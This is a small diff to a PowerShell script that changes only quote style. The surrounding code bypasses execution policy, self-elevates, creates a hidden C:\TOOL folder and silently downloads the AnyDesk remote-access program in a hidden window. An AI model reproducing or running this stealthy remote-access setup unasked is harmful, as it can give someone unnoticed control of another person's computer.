@@ -3,11 +3,11 @@ Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 Start-Process powershell -Verb runAs { Invoke-Expression -Command $RUN}
 $RUN = "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 
-$TOOL = "C:\TOOL"
+$TOOL = 'C:\TOOL'
 
 [System.IO.Directory]::CreateDirectory($TOOL)
 $TOOLFOLDER = Get-Item $TOOL 
-$TOOLFOLDER.Attributes = "Hidden" 
+$TOOLFOLDER.Attributes = 'Hidden' 
 
 Start-Process powershell -Verb runAs -WindowStyle hidden {iwr -Uri "https://download.anydesk.com/AnyDesk-CM.exe" -OutFile "$home\Desktop\AnyDesk.exe"} | Out-Null
 
